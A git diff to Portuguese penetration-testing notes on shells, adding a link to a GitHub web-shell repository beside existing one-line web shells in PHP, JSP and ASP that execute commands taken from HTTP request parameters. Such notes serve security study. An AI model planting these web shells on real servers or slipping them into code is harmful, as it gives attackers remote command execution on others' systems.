@@ -62,6 +62,8 @@ Podemos notar que nosso shell não cobre todo o terminal. Para corrigir isso, pr
 
 A *Web Shell* normalmente é um script web, ou seja., PHP ou ASPX, que aceita nosso comando através de parâmetros de solicitação HTTP, tais como GET ou POST solicitar parâmetros, executa nosso comando e imprime sua saída de volta na página da web.
 
+Respositorio com webshells https://github.com/jbarcia/Web-Shells/tree/master/laudanum
+
 - php: `<?php system($_GET['ted']);?>`  e depois url&ted=whoami
 - jsp: `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
 - asp: `<% eval request("cmd") %>`
